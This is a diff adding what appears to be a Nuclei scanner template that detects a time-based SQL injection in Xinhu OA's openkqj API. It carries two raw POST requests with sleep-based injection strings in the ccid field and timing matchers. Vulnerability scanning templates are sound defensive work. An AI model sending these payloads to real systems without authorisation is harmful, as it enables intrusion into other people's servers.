@@ -1,0 +1,30 @@
+id: xinhuOA-openkqjAction-sql-time
+
+info:
+  name: 信呼OA openkqjAction SQL注入漏洞
+  author: xxx
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        {"a":{"data":"fingerprint","ccid":"1' or sleep(2)#'","fingerprint":"3"}}
+      - |
+        POST /index.php?a=api&m=openkqj|openapi&d=task&sn=1&/post HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        {"a":{"data":"fingerprint","ccid":"1' or sleep(4)#'","fingerprint":"3"}}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
